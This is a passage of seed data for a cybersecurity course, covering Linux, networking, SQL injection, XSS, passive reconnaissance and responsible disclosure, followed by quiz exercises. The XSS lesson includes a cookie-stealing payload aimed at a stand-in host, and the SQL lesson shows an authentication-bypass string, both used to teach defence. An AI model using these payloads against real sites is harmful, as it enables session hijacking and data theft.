                  'Port-scanning systems without explicit authorization is illegal in most jurisdictions and treated as hostile recon everywhere. Scan localhost, scan lab machines, or targets with written permission — build the habit now.',
              },
              { type: 'practice_ref', title: 'Practice: Nmap Basics Quiz', exerciseSlug: 'nmap-basics-quiz' },
              { type: 'lab_ref', labSlug: 'port-discovery', title: 'Lab: Port Discovery' },
              {
                type: 'quiz',
                question: 'What does the nmap flag -sV do?',
                options: [
                  'Performs a UDP-only scan',
                  'Detects service versions behind open ports',
                  'Sets maximum scan speed to maximum',
                  'Scans IPv6 hosts exclusively',
                ],
                correctIndex: 1,
                explanation:
                  '-sV enables version detection: Nmap probes open ports and tries to identify the exact software and version responding.',
              },
            ],
          },
        ],
      },
    ],
  },
  {
    slug: 'linux',
    name: 'Linux',
    levelNumber: 1,
    icon: 'terminal',
    sortOrder: 1,
    description:
      'Linux runs most of the internet — and nearly every attack box. Get fluent in files, permissions, users, and processes.',
    modules: [
      {
        slug: 'linux-fundamentals',
        title: 'Linux Fundamentals',
        description: 'Terminal fluency, the permission model, and how users and processes fit together.',
        lessons: [
          {
            slug: 'terminal-basics',
            title: 'Terminal Basics',
            summary: 'Move around a Linux system from the shell alone — where you are, what is here, and how to look.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'Terminal Basics' },
              {
                type: 'paragraph',
                text:
                  'Almost every server you will assess or defend is Linux, and most of them expose no graphical interface at all — only a shell. The terminal is therefore not a retro affectation but the primary cockpit. The good news: a dozen commands cover most daily work. The shell prints a prompt waiting for input; everything is case-sensitive; and almost every command accepts flags that refine behavior.',
              },
              {
                type: 'command',
                description: 'Learn who and where you are, then inspect your surroundings:',
                commands: ['whoami', 'uname -a', 'pwd', 'ls -la'],
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**pwd** — print working directory (where am I?).',
                  '**cd** — change directory; cd .. goes up, cd ~ goes home.',
                  '**ls -la** — list all files in long form, including hidden dotfiles.',
                  '**cat / less / head / tail** — read files whole, paged, first lines, last lines.',
                  '**mkdir / touch** — create directories and empty files.',
                ],
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Respect rm',
                text:
                  'There is no recycle bin on a headless server. `rm -rf` deletes recursively and without asking — double-check the path before pressing Enter, especially with sudo.',
              },
            ],
          },
          {
            slug: 'files-and-permissions',
            title: 'Files and Permissions',
            summary: 'Decoding rwxr-xr-- : owner, group, others, and why chmod matters to attackers and defenders alike.',
            estimatedMinutes: 10,
            blocks: [
              { type: 'heading', level: 2, text: 'Files and Permissions' },
              {
                type: 'paragraph',
                text:
                  'Linux permissions answer one question for every file: who may read, write, or execute? Each file carries three permission triples — for the owning user, the owning group, and everyone else. In `ls -l` output they appear as nine characters after the file type: r (read), w (write), x (execute) or a dash where a right is absent. Reading them is an instant superpower when hunting misconfigurations on a target.',
              },
              {
                type: 'code',
                language: 'text',
                filename: 'ls-l-annotated.txt',
                code:
                  '-rw-r----- 1 alice dev   2201 Mar 3 10:14 notes.txt\n^ ^^^ ^^^ ^^^\n|  |   |   |\n|  |   |   +-- others: no access at all\n|  |   +------ group (dev): read-only\n|  +---------- owner (alice): read + write\n+------------- regular file (d would mean directory)',
              },
              {
                type: 'paragraph',
                text:
                  'Permissions also have a numeric shorthand: r=4, w=2, x=1, added per triple. So 755 means owner full, group and others read/execute — the classic setting for programs and web roots; 644 is typical for plain data files. When an exploit lands you on a box, one of the first reflexes is listing world-writable files and setuid binaries, because weak permissions frequently convert low-level footholds into root.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**chmod 600 secret.key** — only the owner may read/write.',
                  '**chmod 755 deploy.sh** — owner full; everyone else can run it.',
                  '**chown user:group file** — transfer ownership outright.',
                  '**find / -perm -4000** — hunt setuid binaries (a classic privilege-escalation sweep).',
                ],
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Never chmod 777',
                text:
                  '777 grants the universe write access. It “fixes” an error message by silently creating a security hole — if a service needs write access, give it precisely that, not global rights.',
              },
            ],
          },
          {
            slug: 'users-and-processes',
            title: 'Users and Processes',
            summary: 'UIDs, sudo, ps and kill — understanding who runs what on a Linux machine.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'Users and Processes' },
              {
                type: 'paragraph',
                text:
                  'Everything on Linux runs as some user, identified internally by a UID rather than a name. Root is UID 0 and can do anything, which is exactly why daily work uses unprivileged accounts and elevates briefly via sudo. Accounts live in /etc/passwd (readable by all), while password hashes sit in /etc/shadow (root-only) — a split you will appreciate once you think about what an attacker could do with a copy of either.',
              },
              {
                type: 'command',
                description: 'See which processes are running and which accounts exist:',
                commands: ['ps aux --head -15', 'whoami && id', 'sudo -l'],
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**ps aux** — snapshot of running processes with owners.',
                  '**top / htop** — live process monitor.',
                  '**kill <pid>** — politely ask a process to stop; kill -9 forces.',
                  '**id <user>** — show UID, GID and groups.',
                  '**sudo -l** — list which commands this account may run as root (always check it in labs).',
                ],
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Least privilege, enforced',
                text:
                  'Services should run under dedicated low-power accounts (www-data, postgres), never root. During assessments, discovering something juicy running AS root is always worth a raised eyebrow.',
              },
            ],
          },
        ],
      },
    ],
  },
  {
    slug: 'networking',
    name: 'Networking',
    levelNumber: 2,
    icon: 'network',
    sortOrder: 2,
    description:
      'Layered models made practical: understand traffic end-to-end and learn to read raw packets like a professional.',
    modules: [
      {
        slug: 'network-protocols',
        title: 'Network Protocols',
        description: 'From the OSI model down to individual packets on the wire.',
        lessons: [
          {
            slug: 'osi-model',
            title: 'The OSI Model',
            summary: 'Seven tidy layers that organize a messy stack — plus why each layer has its own attacks.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'The OSI Model' },
              {
                type: 'paragraph',
                text:
                  'Real networks interleave dozens of protocols, so engineers slice the chaos into layers, each responsible for one job and dependent on the ones beneath. The OSI model names seven such layers. It is less a literal blueprint than a shared vocabulary: saying “that’s a layer 2 problem” instantly tells colleagues the scope — switches and MAC addresses — while “layer 7” means application logic and its bugs.',
              },
              {
                type: 'list',
                ordered: true,
                items: [
                  '**1 Physical** — cables, radio, voltages.',
                  '**2 Data Link** — MAC addresses, switches, ARP.',
                  '**3 Network** — IP addressing and routing between networks.',
                  '**4 Transport** — TCP/UDP, ports, connections.',
                  '**5 Session** — establishing and tearing down dialogues.',
                  '**6 Presentation** — encoding, encryption formats.',
                  '**7 Application** — HTTP, DNS, SMTP… and their vulnerabilities.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'Security maps neatly onto the stack. ARP spoofing poisons layer 2 neighbor tables; IP spoofing and routing games live at layer 3; SYN floods and port scans abuse layer 4 semantics; injection and logic flaws are pure layer 7. Firewalls likewise stratify — packet filters at L3/L4, web application firewalls at L7 — and knowing which layer a control operates at tells you what it can and cannot see.',
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Mnemonic',
                text: 'Please Do Not Throw Sausage Pizza Away — Physical, Data Link, Network, Transport, Session, Presentation, Application.',
              },
              {
                type: 'quiz',
                question: 'At which OSI layer does TCP operate?',
                options: ['Layer 2 — Data Link', 'Layer 3 — Network', 'Layer 4 — Transport', 'Layer 7 — Application'],
                correctIndex: 2,
                explanation:
                  'TCP provides host-to-host transport over IP, placing it squarely at layer 4; IP itself is layer 3.',
              },
            ],
          },
          {
            slug: 'packet-analysis',
            title: 'Packet Analysis',
            summary: 'Capture and read raw traffic with tcpdump and Wireshark — the closest thing to x-ray vision for networks.',
            estimatedMinutes: 11,
            blocks: [
              { type: 'heading', level: 2, text: 'Packet Analysis' },
              {
                type: 'paragraph',
                text:
                  'Every theory in this path becomes tangible when you watch actual packets scroll past. Packet capture tools put your NIC in listen mode and record frames with timestamps, endpoints, flags, and payloads. tcpdump gives terse command-line capture; Wireshark wraps the same power in a GUI with coloring rules, protocol dissection, and follow-stream views that reassemble a whole conversation from its packets.',
              },
              {
                type: 'command',
                description: 'Capture HTTP traffic on an interface (stop with Ctrl+C):',
                commands: ['sudo tcpdump -i eth0 port 80', 'sudo tcpdump -i any icmp'],
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**host 10.0.0.5** — traffic to/from one address.',
                  '**port 443** — traffic on one port.',
                  '**tcp[tcpflags] & (tcp-syn) != 0** — SYN packets (handshake beginnings).',
                  '**-w file.pcap** — write raw capture for later Wireshark analysis.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'Those expressions are BPF filters, a tiny language understood by both tcpdump and Wireshark. Analysis sessions tend to follow a rhythm: filter wide (one host or port), spot an interesting exchange, narrow to a stream, then read the payload. Plaintext protocols like HTTP and DNS reveal everything directly; TLS traffic hides content but still exposes SNI names and traffic shapes — both genuinely useful during investigations.',
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Capture legally',
                text: 'Intercepting network traffic you are not authorized to monitor is a crime in most jurisdictions. Practice on your own lab networks and VMs only.',
              },
            ],
          },
        ],
      },
    ],
  },
  {
    slug: 'web',
    name: 'Web Security',
    levelNumber: 3,
    icon: 'globe',
    sortOrder: 3,
    description:
      'Attack the application layer: how injection, script execution, and access-control failures actually happen.',
    modules: [
      {
        slug: 'web-vulnerabilities',
        title: 'Web Vulnerabilities',
        description: 'Two classics — SQL injection and XSS — studied properly, with ethics front and center.',
        lessons: [
          {
            slug: 'sql-injection',
            title: 'SQL Injection',
            summary: 'When user input becomes database code. Understand the flaw deeply enough to prevent it everywhere.',
            estimatedMinutes: 12,
            blocks: [
              { type: 'heading', level: 2, text: 'SQL Injection' },
              {
                type: 'paragraph',
                text:
                  'Databases speak SQL, and web apps build queries constantly — usually with data supplied by users. SQL injection happens when that input is concatenated into the query string instead of passed separately: the boundary between “code” and “data” dissolves, and whatever the attacker submits becomes part of the program. One apostrophe is often enough to start rewriting someone’s query.',
              },
              {
                type: 'code',
                language: 'javascript',
                filename: 'vulnerable-vs-safe.js',
                code:
                  '// VULNERABLE: string concatenation\nconst q = "SELECT * FROM users WHERE email = \'" + email + "\'";\n// email = "\' OR \'1\'=\'1" returns EVERY row\n\n// SAFE: parameterized statement\nconst q = db.prepare("SELECT * FROM users WHERE email = ?");\nq.all(email);',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Authentication bypass** — login forms tricked into matching any user.',
                  '**Data exfiltration** — UNION SELECT or blind techniques dump tables.',
                  '**Destruction** — stacked queries altering or deleting data.',
                  '**Pivot** — reading files or issuing commands via advanced features.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'The fix is refreshingly absolute: never concatenate user input into SQL. Parameterized queries (prepared statements) send the query skeleton and the data on separate channels so the driver can never confuse them; ORMs generate these automatically. Defense-in-depth adds least-privilege DB accounts, allow-list validation where input must match a shape, and error handling that never echoes raw SQL failures to users.',
              },
              {
                type: 'callout',
                variant: 'danger',
                title: 'Ethics checkpoint',
                text:
                  'Attempting SQL injection against systems you do not own and lack written authorization to test is a serious crime, regardless of intent. Every technique in this course must stay inside purpose-built lab targets.',
              },
              {
                type: 'quiz',
                question: 'What is the single best defense against SQL injection?',
                options: [
                  'Escaping quotes manually before concatenating input',
                  'Hiding error messages from users',
                  'Parameterized (prepared) statements for every query',
                  'Renaming database tables randomly',
                ],
                correctIndex: 2,
                explanation:
                  'Prepared statements separate code from data structurally. Manual escaping is error-prone, and hiding errors only removes feedback, not the flaw.',
              },
            ],
          },
          {
            slug: 'xss-cross-site-scripting',
            title: 'XSS: Cross-Site Scripting',
            summary: 'Injecting scripts into pages other people view — the web’s most common vulnerability class.',
            estimatedMinutes: 12,
            blocks: [
              { type: 'heading', level: 2, text: 'XSS: Cross-Site Scripting' },
              {
                type: 'paragraph',
                text:
                  'Browsers trust JavaScript delivered with a page — they cannot tell a framework’s script from an attacker’s. XSS exploits that trust: unsanitized user input reaches the HTML, the browser executes it in the victim’s session, and the payload runs with the victim’s cookies and authority. Unlike SQL injection, the direct victim is another user, not the server.',
              },
              {
                type: 'code',
                language: 'html',
                filename: 'reflected-example.html',
                code:
                  '<!-- search results echo the query back unescaped -->\n<p>Results for: <?php echo $_GET[\'q\']; ?></p>\n\n<!-- request: /search?q=<script>fetch(\'//evil.sh/?c=\'+document.cookie)</script>\n     every visitor clicking that link executes the attacker\'s script -->',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Reflected** — payload travels in the request (often a crafted link) and bounces back into the response.',
                  '**Stored** — payload persists (comment field, profile bio) and fires for every viewer.',
                  '**DOM-based** — client-side JavaScript writes untrusted data into the page itself.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'Impact scales with imagination: cookie theft and session hijacking, keylogging, fake login overlays, silent actions taken as the victim, worm-like propagation through stored payloads. Defenses layer up: context-aware output escaping (HTML body, attribute, JS string each need different treatment), a Content-Security-Policy that blocks inline/untrusted scripts, HttpOnly cookies so theft yields nothing usable, and frameworks whose templating auto-escapes by default.',
              },
              {
                type: 'callout',
                variant: 'danger',
                title: 'Ethics checkpoint',
                text:
                  'Testing XSS means executing code in other people’s browsers. Do it only against lab applications or within a signed authorization scope — never against real sites, and never against real users’ sessions.',
              },
              {
                type: 'quiz',
                question: 'Which combination best reduces stored-XSS impact?',
                options: [
                  'Longer passwords and rate limiting',
                  'Output escaping plus CSP plus HttpOnly cookies',
                  'Blocking all GET requests at the firewall',
                  'Rotating the database password weekly',
                ],
                correctIndex: 1,
                explanation:
                  'Escape on output so payloads render inert, constrain script sources with CSP, and make stolen cookies worthless with HttpOnly.',
              },
            ],
          },
        ],
      },
    ],
  },
  {
    slug: 'recon',
    name: 'Reconnaissance',
    levelNumber: 4,
    icon: 'search',
    sortOrder: 4,
    description:
      'Good operators map before they move: gather intelligence about targets quietly, systematically, and legally.',
    modules: [
      {
        slug: 'recon-essentials',
        title: 'Recon Essentials',
        description: 'Passive information gathering — the quiet phase that shapes everything after it.',
        lessons: [
          {
            slug: 'passive-reconnaissance',
            title: 'Passive Reconnaissance',
            summary: 'Collecting intel without touching the target — public records, certificates, DNS, and archives.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'Passive Reconnaissance' },
              {
                type: 'paragraph',
                text:
                  'Reconnaissance splits by footprint: passive methods leave no trace on the target because you interrogate third parties — search engines, certificate logs, DNS archives — while active methods probe the target directly. Professionals exhaust passive sources first: they are free, legal-ish, invisible to the defender, and routinely yield subdomains, forgotten staging hosts, employee names, leaked technology choices, and old code.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Certificate Transparency logs** — every issued TLS cert reveals hostnames.',
                  '**DNS records** — MX, TXT (SPF!), NS records name vendors and providers.',
                  '**Search engines** — site: queries surface exposed docs, panels, directories.',
                  '**Job postings and staff bios** — disclose the exact tech stack.',
                  '**Web archives** — historical versions expose removed pages and endpoints.',
                ],
              },
              {
                type: 'command',
                description: 'Two passive staples — registration records and DNS mail policy:',
                commands: ['whois example.com', 'dig TXT example.com +short'],
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Quiet does not mean consequence-free',
                text:
                  'Passive recon rarely breaks laws, but compiling profiles of people crosses privacy lines fast. Keep targets to authorized organizations, document your sources, and treat personal data as radioactive.',
              },
            ],
          },
        ],
      },
    ],
  },
  {
    slug: 'vulnerability-research',
    name: 'Vulnerability Research',
    levelNumber: 5,
    icon: 'bug',
    sortOrder: 5,
    description:
      'Find previously unknown flaws and handle disclosure like a professional — responsibly, legally, usefully.',
    modules: [
      {
        slug: 'vuln-research-basics',
        title: 'Vulnerability Research Basics',
        description: 'What vuln research is, and the disclosure norms that keep it legitimate.',
        lessons: [
          {
            slug: 'responsible-disclosure',
            title: 'Responsible Disclosure',
            summary: 'Found something real? Here is how vulnerabilities travel from discovery to fixed — without burning anyone.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'Responsible Disclosure' },
              {
                type: 'paragraph',
                text:
                  'Vulnerability research means hunting flaws that nobody has documented yet — in software you run, software you were hired to test, or increasingly, software covered by a vendor’s bug bounty program. The research skill is technical; what makes researchers valuable rather than dangerous is disclosure discipline: coordinating fixes with maintainers instead of dropping exploits on the open internet while thousands of systems remain unpatched.',
              },
              {
                type: 'paragraph',
                text:
                  'Coordinated disclosure has converged on a rough norm: report privately with clear reproduction steps and impact analysis, agree on a timeline (commonly around ninety days), let the vendor ship a patch, then publish details once users are protected. Many organizations formalize this via a Vulnerability Disclosure Policy (VDP) page — security.txt files and dedicated portals — and Suraksha Labs itself runs one, so graduates of these paths have a lawful place to point their findings.',
              },
              {
                type: 'list',
                ordered: true,
                items: [
                  'Document the finding: affected versions, precise reproduction steps, impact assessment.',
                  'Report privately through the vendor’s designated channel.',
                  'Communicate respectfully; negotiate remediation timelines.',
                  'Allow time for a patch and coordinated release.',
                  'Publish your write-up after the fix, crediting the process.',
                ],
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Why vendors pay for this',
                text:
                  'A well-written report saves engineering weeks and breach millions. Bug bounties exist because external eyes scale better than internal teams — and because disciplined researchers beat extortionists to their own mailboxes.',
              },
            ],
          },
        ],
      },
    ],
  },
];

export const EXERCISE_SEEDS: ExerciseSeed[] = [
  {
    lessonSlug: 'what-is-a-computer-network',
    slug: 'network-basics-quiz',
    title: 'Network Basics Quiz',
    instructions: 'Five quick questions on networks, packets, and the Internet’s shape. Answer from understanding, not memory.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'What is the smallest unit of data routed across a packet-switched network?',
        options: ['A frame', 'A packet', 'A bit', 'A socket'],
        correctIndex: 1,
        explanation: 'Messages are sliced into packets which are routed independently and reassembled by the receiver.',
      },
      {
        prompt: 'Which device connects your home LAN to your ISP?',
        options: ['Switch', 'Router', 'Hub', 'Repeater'],
        correctIndex: 1,
        explanation: 'Routers forward traffic between different networks; switches connect devices within one network.',
      },
      {
        prompt: 'The Internet is best described as…',
        options: [
          'One large corporate network',
          'A network of interconnected autonomous networks',
          'A wireless-only system',
          'An application installed on computers',
        ],
        correctIndex: 1,
        explanation: 'Autonomous systems agree to exchange traffic via shared protocols — hence “network of networks.”',
      },
      {
        prompt: 'Why does every device on a network need an address?',
        options: [
          'To make the network faster',
          'So routers know where to deliver its packets',
          'Because browsers require it',
          'Addresses are purely decorative',
        ],
        correctIndex: 1,
        explanation: 'Delivery requires an identifier — IP addresses play that role at the network layer.',
      },
    ],
  },
  {
    lessonSlug: 'ip-addresses',
    slug: 'ip-addresses-quiz',
    title: 'IP Addresses Quiz',
    instructions: 'Check yourself on IPv4, IPv6, and public vs private addressing.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'How many bits long is an IPv4 address?',
        options: ['16', '32', '64', '128'],
        correctIndex: 1,
        explanation: 'IPv4 uses 32 bits (four octets); IPv6 expanded this to 128 bits.',
      },
      {
        prompt: 'Which range is RFC 1918 private space?',
        options: ['11.0.0.0/8', '192.168.0.0/16', '172.32.0.0/12', '8.8.0.0/16'],
        correctIndex: 1,
        explanation: 'Private ranges are 10/8, 172.16/12 (up to 172.31), and 192.168/16.',
      },
      {
        prompt: 'What does 127.0.0.1 always refer to?',
        options: ['Your default gateway', 'The nearest DNS server', 'This machine itself (loopback)', 'A broadcast address'],
        correctIndex: 2,
        explanation: 'Loopback traffic never leaves the host — useful for testing local services safely.',
      },
      {
        prompt: 'NAT allows many private addresses to share what?',
        options: ['One subnet mask', 'One public IP address', 'One MAC address', 'One DNS record'],
        correctIndex: 1,
        explanation: 'NAT rewrites source addresses so many internal devices can share a single public IP.',
      },
    ],
  },
  {
    lessonSlug: 'ports',
    slug: 'ports-quiz',
    title: 'Ports Quiz',
    instructions: 'Ports pair services with numbers. Prove you know the famous ones.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'What port range can ports occupy?',
        options: ['0–255', '1–1023', '0–65535', '1024–9999'],
        correctIndex: 2,
        explanation: 'Ports are 16-bit numbers: 0 through 65535.',
      },
      {
        prompt: 'SSH listens by default on which port?',
        options: ['21', '22', '23', '25'],
        correctIndex: 1,
        explanation: '22 is SSH; 21 is FTP, 23 Telnet, 25 SMTP.',
      },
      {
        prompt: '“Port 3306 is open” most likely means the machine runs…',
        options: ['A MySQL database', 'A print server', 'A VPN', 'An email relay'],
        correctIndex: 0,
        explanation: '3306 is MySQL’s default. Open ports hint at running services — exactly why attackers enumerate them.',
      },
      {
        prompt: 'From a defender’s view, the ideal number of open ports is…',
        options: ['As many as possible for convenience', 'Only those with a documented business need', 'Exactly 100', 'Whatever the default OS install leaves'],
        correctIndex: 1,
        explanation: 'Every open port is attack surface; hardening means closing everything not explicitly required.',
      },
    ],
  },
  {
    lessonSlug: 'tcp-and-udp',
    slug: 'tcp-and-udp-quiz',
    title: 'TCP and UDP Quiz',
    instructions: 'Two transports, two philosophies. Pick the right tool for each job.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'How many steps are in TCP’s three-way handshake?',
        options: ['Two', 'Three', 'Four', 'It varies'],
        correctIndex: 1,
        explanation: 'SYN → SYN-ACK → ACK establishes sequence numbers in both directions.',
      },
      {
        prompt: 'Which protocol would a DNS resolver typically use for a standard lookup?',
        options: ['UDP', 'TCP', 'ICMP', 'ARP'],
        correctIndex: 0,
        explanation: 'Classic DNS queries ride UDP/53 for speed, falling back to TCP for large responses or zone transfers.',
      },
      {
        prompt: 'UDP sacrifices which property compared to TCP?',
        options: ['Speed', 'Delivery guarantees', 'Port numbering', 'Checksums entirely'],
        correctIndex: 1,
        explanation: 'UDP is fire-and-forget: no ordering, no retransmission — ideal when freshness beats completeness.',
      },
      {
        prompt: 'During a scan, “filtered” usually indicates…',
        options: ['The service crashed', 'A firewall dropped or silenced the probe', 'The port responds instantly', 'Wrong checksum'],
        correctIndex: 1,
        explanation: 'Filtered means something between you and the port swallowed the packets — typically filtering.',
      },
    ],
  },
  {
    lessonSlug: 'dns',
    slug: 'dns-quiz',
    title: 'DNS Quiz',
    instructions: 'Names into numbers. Test your grasp of resolution, records, and caching.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Which DNS record type maps a hostname to an IPv4 address?',
        options: ['MX', 'CNAME', 'A', 'TXT'],
        correctIndex: 2,
        explanation: 'A records hold IPv4 addresses; AAAA holds IPv6; MX points to mail servers.',
      },
      {
        prompt: 'What does a record’s TTL control?',
        options: ['How long resolvers may cache the answer', 'Transfer speed limits', 'Record encryption strength', 'Domain ownership length'],
        correctIndex: 0,
        explanation: 'Time-To-Live bounds caching, trading lookup speed against how quickly changes propagate.',
      },
      {
        prompt: 'At the top of the DNS hierarchy sit…',
        options: ['Registrar servers', 'Root name servers', 'Your ISP’s cache', 'Local hosts files'],
        correctIndex: 1,
        explanation: 'Resolution walks root → TLD → authoritative; roots delegate the top-level domains.',
      },
      {
        prompt: 'Why is plaintext DNS a privacy concern on shared networks?',
        options: [
          'It slows browsing noticeably',
          'Anyone on the path can see which names you resolve',
          'It reveals stored passwords',
          'Resolvers refuse encrypted clients',
        ],
        correctIndex: 1,
        explanation: 'Queries travel unencrypted, exposing browsing intent to observers — motivating DoH/DoT.',
      },
    ],
  },
  {
    lessonSlug: 'http',
    slug: 'http-quiz',
    title: 'HTTP Quiz',
    instructions: 'Methods, messages, and statelessness — the web’s grammar.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'HTTP is described as stateless because…',
        options: [
          'Servers never store any data anywhere',
          'Each request must be self-contained; nothing is remembered between requests',
          'Responses are always empty',
          'Connections cannot persist',
        ],
        correctIndex: 1,
        explanation: 'Statelessness means no built-in memory across requests — cookies/sessions layer state on top.',
      },
      {
        prompt: 'Where does a POST request carry its submitted data?',
        options: ['The URL query string', 'The request body', 'A custom DNS record', 'The Host header'],
        correctIndex: 1,
        explanation: 'POST payloads live in the body; GET parameters ride the URL, leaking values into logs and history.',
      },
      {
        prompt: 'Which status code signals “request succeeded”?',
        options: ['301', '404', '200', '500'],
        correctIndex: 2,
        explanation: '200 OK is the canonical success code in the 2xx family.',
      },
      {
        prompt: 'Sending sensitive data via GET is risky mainly because…',
        options: ['GET cannot be encrypted', 'URLs get logged, cached, and appear in history', 'GET bodies are too small', 'Browsers block GET forms'],
        correctIndex: 1,
        explanation: 'Parameters in URLs leak into server logs, proxies, bookmarks, and browser history.',
      },
    ],
  },
  {
    lessonSlug: 'cookies',
    slug: 'cookies-quiz',
    title: 'Cookies Quiz',
    instructions: 'Cookie attributes decide whether a stolen cookie is worthless or catastrophic.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'The Secure attribute ensures the cookie…',
        options: ['Is encrypted at rest', 'Is only sent over HTTPS', 'Cannot be deleted', 'Expires immediately'],
        correctIndex: 1,
        explanation: 'Secure restricts transmission to encrypted channels, blocking passive interception.',
      },
      {
        prompt: 'SameSite=Lax primarily mitigates which attack?',
        options: ['SQL injection', 'CSRF (cross-site request forgery)', 'DNS poisoning', 'Brute force login'],
        correctIndex: 1,
        explanation: 'Lax blocks cookies on most cross-site requests, defusing forged cross-origin actions.',
      },
      {
        prompt: 'Whoever steals your session cookie gains…',
        options: ['Nothing useful', 'Read access to the site’s database', 'Your logged-in access without needing the password', 'Admin rights automatically'],
        correctIndex: 2,
        explanation: 'The cookie IS the session credential — replaying it impersonates you until it expires.',
      },
      {
        prompt: 'HttpOnly cookies are invisible to…',
        options: ['The server', 'JavaScript in the browser', 'HTTPS proxies', 'Incognito mode'],
        correctIndex: 1,
        explanation: 'HttpOnly hides the cookie from document.cookie, so XSS scripts cannot simply read and exfiltrate it.',
      },
    ],
  },
  {
    lessonSlug: 'nmap-first-scan',
    slug: 'nmap-basics-quiz',
    title: 'Nmap Basics Quiz',
    instructions: 'You ran -sV against localhost. Now prove you understood what Nmap told you.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Nmap’s default scan type uses which trick?',
        options: [
          'Completing full TCP handshakes with every port',
          'Sending SYN packets and never finishing the handshake',
          'Flooding ports with UDP datagrams',
          'Logging into each service as guest',
        ],
        correctIndex: 1,
        explanation: 'Half-open SYN scans elicit answers while avoiding full connection establishment.',
      },
      {
        prompt: 'A port reported as “closed” means…',
        options: [
          'A service is listening there',
          'Nothing is listening but the host answered (no filter blocked you)',
          'The host is offline',
          'Nmap lacked privileges',
        ],
        correctIndex: 1,
        explanation: 'Closed = reachable host, RST received, no listener. Open = live service; filtered = silence.',
      },
      {
        prompt: 'Which flag adds service/version detection to a scan?',
        options: ['-sn', '-sV', '-Pn', '-O'],
        correctIndex: 1,
        explanation: '-sV probes open ports to fingerprint software and versions.',
      },
      {
        prompt: 'Scanning infrastructure you do not own without explicit permission is…',
        options: [
          'Fine if results stay unpublished',
          'Fine during weekends',
          'Unauthorized and illegal in most jurisdictions',
          'Encouraged as responsible disclosure',
        ],
        correctIndex: 2,
        explanation: 'Authorization is the bright line. Practice exclusively on lab targets or systems you own.',
      },
    ],
  },
];
